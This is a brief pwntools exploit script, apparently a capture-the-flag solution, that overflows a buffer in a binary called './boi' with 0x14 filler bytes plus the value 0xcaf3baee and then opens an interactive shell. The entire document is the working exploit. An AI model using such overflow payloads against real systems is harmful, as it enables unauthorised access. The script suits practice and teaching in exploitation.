from pwn import *

p = process("./boi")  # or remote("host", port)

payload = b"0" * 0x14 + p32(0xcaf3baee)
p.send(payload)    # send raw bytes
p.interactive()                # 